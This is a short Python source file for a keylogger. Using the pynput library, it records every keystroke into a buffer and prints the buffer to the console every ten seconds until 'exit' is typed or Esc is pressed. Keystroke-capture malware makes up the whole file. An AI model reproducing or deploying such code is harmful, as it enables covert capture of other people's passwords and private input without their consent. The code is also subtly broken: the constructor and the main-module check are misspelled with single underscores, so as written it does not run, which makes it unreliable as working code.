import pynput.keyboard
import threading

class Keylogger:
    def _init_(self):
        self.log = ''
        self.stop_keylogger = False

    def append_to_keylog(self, string):
        self.log += string

    def on_press(self, key):
        try:
            current_key = key.char
        except AttributeError:
            if key == pynput.keyboard.Key.esc:
                return False
            elif key == pynput.keyboard.Key.space:
                current_key = ' '
            elif key == pynput.keyboard.Key.enter:
                current_key = '\n'
            elif key == pynput.keyboard.Key.backspace:
                current_key = '[BACKSPACE]'
            elif key == pynput.keyboard.Key.tab:
                current_key = '[TAB]'
            else:
                current_key = f'[{str(key)}]'

        self.append_to_keylog(current_key)

        # Check for "exit" keyword
        if "exit" in self.log.lower():
            self.stop_keylogger = True
            return False

    def report(self):
        print(self.log)
        self.log = ''
        if not self.stop_keylogger:
            timer = threading.Timer(10, self.report)
            timer.start()

    def start(self):
        with pynput.keyboard.Listener(on_press=self.on_press) as listener:
            self.report()
            listener.join()


if __name__== '_main_':
    keylogger = Keylogger()
    keylogger.start()